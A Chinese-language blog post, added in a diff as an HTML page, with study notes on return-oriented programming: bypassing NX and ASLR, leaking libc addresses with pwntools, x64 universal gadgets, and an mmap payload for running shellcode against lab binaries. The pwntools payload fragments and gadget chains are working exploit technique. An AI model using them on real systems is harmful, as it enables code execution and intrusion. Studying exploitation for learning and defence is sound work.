@@ -1,0 +1,363 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+    <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="HandheldFriendly" content="true">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Yuri,blog" />
+    <meta name="generator" content="Maverick 1.1" />
+    <meta name="template" content="Galileo" />
+    <link rel="alternate" type="application/rss+xml" title="YuriSec &raquo; RSS 2.0" href="/yuriufo-blog.github.io/feed/index.xml" />
+    <link rel="alternate" type="application/atom+xml" title="YuriSec &raquo; ATOM 1.0" href="/yuriufo-blog.github.io/feed/atom/index.xml" />
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/yuriufo/yuriufo-blog.github.io@gh-pages/assets/galileo-1c8f2638f2.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/yuriufo/yuriufo-blog.github.io@gh-pages/assets/ExSearch/ExSearch-182e5a8868.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/yuriufo/yuriufo-blog.github.io@gh-pages/assets/katex.min.css">
+    <link href="https://fonts.googleapis.com/css?family=Fira+Code&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700&display=swap">
+    <script>
+        var ExSearchConfig = {
+            root: "",
+            api: "https://cdn.jsdelivr.net/gh/yuriufo/yuriufo-blog.github.io@gh-pages/9b360c2fc937db6438c52ea4e0846876.json"
+        }
+    </script>
+    
+<title>一步一步学ROP笔记 - YuriSec</title>
+<meta name="author" content="yuri" />
+<meta name="description" content="ROP的全称为Return-oriented programming(返回导向编程),这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御(比如DEP, ASLR等)." />
+<meta property="og:title" content="一步一步学ROP笔记 - YuriSec" />
+<meta property="og:description" content="ROP的全称为Return-oriented programming(返回导向编程),这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御(比如DEP, ASLR等)." />
+<meta property="og:site_name" content="YuriSec" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/yuriufo-blog.github.io/archives/RopNote/" />
+<meta property="og:image" content="" />
+<meta property="article:published_time" content="2018-03-28T14:45:00-00.00" />
+<meta name="twitter:title" content="一步一步学ROP笔记 - YuriSec" />
+<meta name="twitter:description" content="ROP的全称为Return-oriented programming(返回导向编程),这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御(比如DEP, ASLR等)." />
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:image" content="" />
+
+
+    
+<meta http-equiv="x-dns-prefetch-control" content="on">
+<link rel="dns-prefetch" href="//cdn.jsdelivr.net" />
+
+    </head>
+    
+    <body>
+        
+        <div class="container">
+            <header id="ga-header">
+                <div first>
+                    <aside id="ga-brand">
+                        <h1 class="brand"><a class="no-style" href="/yuriufo-blog.github.io/">YuriSec</a></h1>
+                        <p>A simple static blog.</p>
+                    </aside>
+                </div>
+                <div second id="ga-nav">
+                    <nav class="navs">
+                        <ul><li><a class="ga-highlight" href="/yuriufo-blog.github.io/" target="_self">首页</a></li><span class="separator">·</span><li><a class="ga-highlight" href="/yuriufo-blog.github.io/archives/" target="_self">归档</a></li><span class="separator">·</span><li><a class="ga-highlight" href="/yuriufo-blog.github.io/about/" target="_self">关于</a></li><span class="separator">·</span><li><a href="#" target="_self" class="search-form-input ga-highlight">搜索</a></li></ul>
+                    </nav>
+                </div>
+            </header>
+            <div class="wrapper">
+                
+<main>    
+    <section class="ga-section ga-content">
+        <article class="yue">
+            <h1 class="ga-post_title">一步一步学ROP笔记</h1>
+            <span class="ga-post_meta ga-mono">
+                <span>yuri</span>
+                <time>
+                    2018-03-28
+                </time>
+                
+                in <a no-style class="category" href="/yuriufo-blog.github.io/category/pwn/">
+                    pwn
+                </a>
+                
+                
+            </span>
+            <div class="ga-content_body">
+                <h1>一步一步学ROP笔记</h1>
+<blockquote>
+<p>原文地址: <a href="drops.wooyun.org/tips/6597">一步一步学ROP</a></p>
+</blockquote>
+<h2>x86</h2>
+<h3>无保护</h3>
+<ul>
+<li>关掉canary:  <strong>-fno-stack-protector</strong></li>
+<li>关掉NX:  <strong>-z execstack</strong></li>
+<li>关掉PIE:  <strong>sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space</strong></li>
+</ul>
+<h3>绕过NX</h3>
+<p>gdb下找<code>system()</code>和<code>&quot;/bin/sh\x00&quot;</code>的地址:</p>
+<div class="highlight"><pre><span></span><span class="o">(</span>gdb<span class="o">)</span> print system
+<span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xb7e5f460 &lt;system&gt;
+<span class="o">(</span>gdb<span class="o">)</span> print __libc_start_main
+<span class="nv">$2</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xb7e393f0 &lt;__libc_start_main&gt;
+<span class="o">(</span>gdb<span class="o">)</span> find 0xb7e393f0, +2200000, <span class="s2">&quot;/bin/sh&quot;</span>
+0xb7f81ff8
+<span class="o">(</span>gdb<span class="o">)</span> x/s 0xb7f81ff8
+0xb7f81ff8:  <span class="s2">&quot;/bin/sh&quot;</span>
+</pre></div>
+<h3>绕过NX和PIE</h3>
+<ul>
+<li>看plt : <strong>objdump -d -j .plt level2</strong></li>
+<li>看got : <strong>objdump -R level2</strong></li>
+<li>查看目标程序调用的so库 : <strong>ldd level2</strong></li>
+</ul>
+<p>用pwntools:</p>
+<div class="highlight"><pre><span></span><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;level2&#39;</span><span class="p">)</span>
+<span class="n">plt_write</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
+<span class="n">got_write</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
+
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;libc.so&#39;</span><span class="p">)</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">write_addr</span> <span class="o">-</span> <span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">])</span>
+</pre></div>
+<h3>无libc.so</h3>
+<p>步骤:</p>
+<ol>
+<li>泄露<code>__libc_start_main</code>地址</li>
+<li>获取<code>libc</code>版本</li>
+<li>获取<code>system</code>地址与<code>/bin/sh</code>的地址</li>
+<li>再次执行源程序</li>
+<li>触发栈溢出执行<code>system(“/bin/sh”)</code></li>
+</ol>
+<p>DynELF的使用:</p>
+<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">address</span><span class="p">):</span>
+    <span class="n">payload1</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">140</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">plt_write</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">vulfun_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">address</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+    <span class="nb">print</span> <span class="s2">&quot;</span><span class="si">%#x</span><span class="s2"> =&gt; </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="p">(</span><span class="n">data</span> <span class="ow">or</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">data</span>
+
+<span class="n">d</span> <span class="o">=</span> <span class="n">DynELF</span><span class="p">(</span><span class="n">leak</span><span class="p">,</span> <span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./level2&#39;</span><span class="p">))</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="n">lookup</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">,</span> <span class="s1">&#39;libc&#39;</span><span class="p">)</span>
+</pre></div>
+<hr />
+<h2>x64</h2>
+<h3>传参区别</h3>
+<ul>
+<li>前六个参数保存顺序 : <strong>RDI, RSI, RDX, RCX, R8, R9</strong></li>
+</ul>
+<h3>gadgets</h3>
+<ul>
+<li>找ROP:  <strong>ROPgadget --binary level4 --only &quot;pop|ret&quot;</strong></li>
+<li>过滤:  <strong>ROPgadget --binary libc.so.6 --only &quot;pop|ret&quot; | grep rdi</strong></li>
+</ul>
+<h3>通用gadgets part1</h3>
+<p><code>__libc_csu_init()</code>下:</p>
+<div class="highlight"><pre><span></span>.text:0000000000400840                 public __libc_csu_init
+.text:0000000000400840 __libc_csu_init proc near               <span class="p">;</span> DATA XREF: _start+16o
+.text:0000000000400840                 push    r15
+.text:0000000000400842                 mov     r15d, edi
+.text:0000000000400845                 push    r14
+.text:0000000000400847                 mov     r14, rsi
+.text:000000000040084A                 push    r13
+.text:000000000040084C                 mov     r13, rdx
+.text:000000000040084F                 push    r12
+.text:0000000000400851                 lea     r12, __frame_dummy_init_array_entry
+.text:0000000000400858                 push    rbp
+.text:0000000000400859                 lea     rbp, __do_global_dtors_aux_fini_array_entry
+.text:0000000000400860                 push    rbx
+.text:0000000000400861                 sub     rbp, r12
+.text:0000000000400864                 xor     ebx, ebx
+.text:0000000000400866                 sar     rbp, <span class="m">3</span>
+.text:000000000040086A                 sub     rsp, <span class="m">8</span>
+.text:000000000040086E                 call    _init_proc
+.text:0000000000400873                 <span class="nb">test</span>    rbp, rbp
+.text:0000000000400876                 jz      short loc_400896
+.text:0000000000400878                 nop     dword ptr <span class="o">[</span>rax+rax+00000000h<span class="o">]</span>
+.text:0000000000400880
+.text:0000000000400880 loc_400880:                             <span class="p">;</span> CODE XREF: __libc_csu_init+54j
+.text:0000000000400880                 mov     rdx, r13
+.text:0000000000400883                 mov     rsi, r14
+.text:0000000000400886                 mov     edi, r15d
+.text:0000000000400889                 call    qword ptr <span class="o">[</span>r12+rbx*8<span class="o">]</span>
+.text:000000000040088D                 add     rbx, <span class="m">1</span>
+.text:0000000000400891                 cmp     rbx, rbp
+.text:0000000000400894                 jnz     short loc_400880
+.text:0000000000400896
+.text:0000000000400896 loc_400896:                             <span class="p">;</span> CODE XREF: __libc_csu_init+36j
+.text:0000000000400896                 add     rsp, <span class="m">8</span>
+.text:000000000040089A                 pop     rbx
+.text:000000000040089B                 pop     rbp
+.text:000000000040089C                 pop     r12
+.text:000000000040089E                 pop     r13
+.text:00000000004008A0                 pop     r14
+.text:00000000004008A2                 pop     r15
+.text:00000000004008A4                 retn
+.text:00000000004008A4 __libc_csu_init endp
+</pre></div>
+<p>因此若要调用<code>write(1,got_write,8)</code>, 则可这样构造:</p>
+<div class="highlight"><pre><span></span><span class="c1"># rbx必须为0,因为call qword ptr [r12+rbx*8]</span>
+<span class="c1"># rbp必须为1,0x40088D~0x400894有一个cmp,jnz</span>
+<span class="c1"># r12 = addr_got,因为call qword ptr [r12+rb1x*8]</span>
+<span class="c1"># r13 = rdx = arg3</span>
+<span class="c1"># r14 = rsi = arg2</span>
+<span class="c1"># r15 = edi = arg1</span>
+<span class="c1"># retn的padding需要7*8=56byte</span>
+
+<span class="c1"># padding</span>
+<span class="n">payload1</span> <span class="o">=</span>  <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="o">*</span><span class="mi">136</span> 
+<span class="c1"># pop rbx地址_rbx=0_rbp=1_调用函数got_arg1_arg2_arg3</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40089A</span><span class="p">)</span> <span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">got_write</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">got_write</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> 
+<span class="c1"># mov rdx,r13地址(注意看原始汇编)</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400880</span><span class="p">)</span> 
+<span class="c1"># padding(7*8=56byte)</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="o">*</span><span class="mi">56</span>
+<span class="c1"># ret</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>
+</pre></div>
+<p>此外还有一个x64 gadgets, 就是:</p>
+<ul>
+<li>pop rdi</li>
+<li>ret</li>
+</ul>
+<p>的gadgets. 这个gadgets是由opcode错位产生的.</p>
+<p>如上的例子中0x4008A2, 0x4008A4两处的字节码如下:</p>
+<ul>
+<li>0x41 0x5f 0xc3</li>
+</ul>
+<p>意思是<code>pop r15, ret</code>, 但是恰好<code>pop rdi, ret</code>的opcode如下:</p>
+<ul>
+<li>0x5f 0xc3</li>
+</ul>
+<p>因此如果我们指向0x4008A3就可以获得<code>pop rdi, ret</code>的opcode, 从而对于单参数函数可以直接获得执行
+与此类似的, 还有0x4008A1处的 <code>pop rsi, pop r15, ret</code>
+那么这个有什么用呢？我们知道x64传参顺序是<strong>rdi, rsi, rdx, rcx</strong>.
+所以rsi是第二个参数, 我们可以在rop中配合<code>pop rdi,ret</code>来使用<code>pop rsi, pop r15,ret</code>, 这样就可以轻松的调用2个参数的函数.
+综上, 就是x64下利用通用gadgets调用一个参数, 两个参数, 三个参数函数的方法.</p>
+<h3>通用gadgets part2</h3>
+<p><code>_dl_runtime_resolve()</code>下<strong>(在内存中的地址是随机的)</strong>:</p>
+<div class="highlight"><pre><span></span>0x7ffff7def200 &lt;_dl_runtime_resolve&gt;:       sub     rsp,0x38
+0x7ffff7def204 &lt;_dl_runtime_resolve+4&gt;:     mov     QWORD PTR <span class="o">[</span>rsp<span class="o">]</span>,rax
+0x7ffff7def208 &lt;_dl_runtime_resolve+8&gt;:     mov     QWORD PTR <span class="o">[</span>rsp+0x8<span class="o">]</span>,rcx
+0x7ffff7def20d &lt;_dl_runtime_resolve+13&gt;:    mov     QWORD PTR <span class="o">[</span>rsp+0x10<span class="o">]</span>,rdx
+0x7ffff7def212 &lt;_dl_runtime_resolve+18&gt;:    mov     QWORD PTR <span class="o">[</span>rsp+0x18<span class="o">]</span>,rsi
+0x7ffff7def217 &lt;_dl_runtime_resolve+23&gt;:    mov     QWORD PTR <span class="o">[</span>rsp+0x20<span class="o">]</span>,rdi
+0x7ffff7def21c &lt;_dl_runtime_resolve+28&gt;:    mov     QWORD PTR <span class="o">[</span>rsp+0x28<span class="o">]</span>,r8
+0x7ffff7def221 &lt;_dl_runtime_resolve+33&gt;:    mov     QWORD PTR <span class="o">[</span>rsp+0x30<span class="o">]</span>,r9
+0x7ffff7def226 &lt;_dl_runtime_resolve+38&gt;:    mov     rsi,QWORD PTR <span class="o">[</span>rsp+0x40<span class="o">]</span>
+0x7ffff7def22b &lt;_dl_runtime_resolve+43&gt;:    mov     rdi,QWORD PTR <span class="o">[</span>rsp+0x38<span class="o">]</span>
+0x7ffff7def230 &lt;_dl_runtime_resolve+48&gt;:    call    0x7ffff7de8680 &lt;_dl_fixup&gt;
+0x7ffff7def235 &lt;_dl_runtime_resolve+53&gt;:    mov     r11,rax
+0x7ffff7def238 &lt;_dl_runtime_resolve+56&gt;:    mov     r9,QWORD PTR <span class="o">[</span>rsp+0x30<span class="o">]</span>
+0x7ffff7def23d &lt;_dl_runtime_resolve+61&gt;:    mov     r8,QWORD PTR <span class="o">[</span>rsp+0x28<span class="o">]</span>
+0x7ffff7def242 &lt;_dl_runtime_resolve+66&gt;:    mov     rdi,QWORD PTR <span class="o">[</span>rsp+0x20<span class="o">]</span>
+0x7ffff7def247 &lt;_dl_runtime_resolve+71&gt;:    mov     rsi,QWORD PTR <span class="o">[</span>rsp+0x18<span class="o">]</span>
+0x7ffff7def24c &lt;_dl_runtime_resolve+76&gt;:    mov     rdx,QWORD PTR <span class="o">[</span>rsp+0x10<span class="o">]</span>
+0x7ffff7def251 &lt;_dl_runtime_resolve+81&gt;:    mov     rcx,QWORD PTR <span class="o">[</span>rsp+0x8<span class="o">]</span>
+0x7ffff7def256 &lt;_dl_runtime_resolve+86&gt;:    mov     rax,QWORD PTR <span class="o">[</span>rsp<span class="o">]</span>
+0x7ffff7def25a &lt;_dl_runtime_resolve+90&gt;:    add     rsp,0x48
+0x7ffff7def25e &lt;_dl_runtime_resolve+94&gt;:    jmp     r11
+</pre></div>
+<ul>
+<li>可以通过函数的PLT确定<code>_dl_runtime_resolve()</code>地址, 其中<code>PLT[2]</code>中跳转的地址就是<code>_dl_runtime_resolve()</code>地址</li>
+<li>要利用这个gadget, 我们还需要控制rax的值, 因为gadget是通过rax跳转的:<div class="highlight"><pre><span></span>0x7ffff7def235 &lt;_dl_runtime_resolve+53&gt;:    mov    r11,rax
+...
+0x7ffff7def25e &lt;_dl_runtime_resolve+94&gt;:    jmp    r11
+</pre></div>
+</li>
+</ul>
+<hr />
+<h2>利用mmap执行任意shellcode</h2>
+<p>mmap或者mprotect将某块内存改成RWX, 然后将shellcode保存到这块内存, 然后控制pc跳转过去就可以执行任意的shellcode了.</p>
+<div class="highlight"><pre><span></span><span class="c1"># mmap(rdi=shellcode_addr, rsi=1024, rdx=7, rcx=34, r8=0, r9=0)</span>
+<span class="c1"># 参数传递从linker_addr + 0x35开始</span>
+<span class="c1"># 需要先pop rax,ret,且使rax=mmap_addr</span>
+<span class="c1"># r9,r8,rdi,rsi,rdx,rcx,rax</span>
+<span class="c1"># 最后需要(0x48-8*6)/8 = 3Byte padding</span>
+<span class="n">payload3</span> <span class="o">=</span>  <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="o">*</span><span class="mi">136</span>
+<span class="n">payload3</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">mmap_addr</span><span class="p">)</span>
+<span class="n">payload3</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">linker_addr</span><span class="o">+</span><span class="mh">0x35</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">34</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">shellcode_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</pre></div>
+
+            </div>
+        </article>
+        <div id="ga-tags">
+    
+    <span class="ga-tag">
+        <a class="ga-highlight" href="/yuriufo-blog.github.io/tag/pwn/">#pwn</a>
+    </span>
+    
+    <span class="ga-tag">
+        <a class="ga-highlight" href="/yuriufo-blog.github.io/tag/ROP/">#ROP</a>
+    </span>
+    
+</div>
+    </section>
+
+    
+<section id="ga-content_pager">
+
+    <div class="next">
+        <h3>没有了</h3>
+        <p class="yue">这是最新的文章</p>
+    </div>
+
+
+    <div class="prev">
+        <h3>没有了</h3>
+        <p class="yue">这是最旧的文章</p>
+    </div>
+
+</section>
+
+
+    
+
+</main>
+
+                <footer class="ga-mono" id="ga-footer">
+                    <section>
+                        <span id="ga-uptime"></span>
+                        <span class="brand">YuriSec</span>
+                    </section>
+                    <section>
+                        <p class="copyright">
+                            <span>Copyright © 2020 Yuri</span>
+                            <span>Powered by <a no-style href="https://github.com/AlanDecode/Maverick" target="_blank">Maverick & Galileo</a></span>
+                        </p>
+                        <div class="copyright">
+                            <span class="footer-addon">
+                                
+<a href="http://www.beian.miit.gov.cn/" rel="noopener" target="_blank">京ICP备20016612号</a>
+
+                            </span>
+                            <nav class="social-links">
+                                <ul><li><a class="no-style" title="GitHub" href="https://github.com/yuriufo" target="_blank"><i class="gi gi-github"></i>GitHub</a></li><span class="separator">·</span><li><a class="no-style" title="Weibo" href="https://weibo.com/qq771739864" target="_blank"><i class="gi gi-weibo"></i>Weibo</a></li></ul>
+                            </nav>
+                        </div>
+                    </section>
+                    <script>
+                        var site_build_date = "2018-03-28T00:00+08:00"
+                    </script>
+                    <script src="https://cdn.jsdelivr.net/gh/yuriufo/yuriufo-blog.github.io@gh-pages/assets/galileo-dc4baa7cf4.js"></script>
+                </footer>
+            </div>
+        </div>
+    </div>
+
+    <!--katex-->
+    <script defer src="https://cdn.jsdelivr.net/gh/yuriufo/yuriufo-blog.github.io@gh-pages/assets/katex.min.js"></script>
+    <script>
+    mathOpts = {
+        delimiters: [
+            {left: "$$", right: "$$", display: true},
+            {left: "\\[", right: "\\]", display: true},
+            {left: "$", right: "$", display: false},
+            {left: "\\(", right: "\\)", display: false}
+        ]
+    };
+    </script>
+    <script defer src="https://cdn.jsdelivr.net/gh/yuriufo/yuriufo-blog.github.io@gh-pages/assets/auto-render.min.js" onload="renderMathInElement(document.body, mathOpts);"></script>
+
+    <script src="https://cdn.jsdelivr.net/gh/yuriufo/yuriufo-blog.github.io@gh-pages/assets/ExSearch/jquery.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/yuriufo/yuriufo-blog.github.io@gh-pages/assets/ExSearch/ExSearch-493cb9cd89.js"></script>
+
+    
+    </body>
+</html>
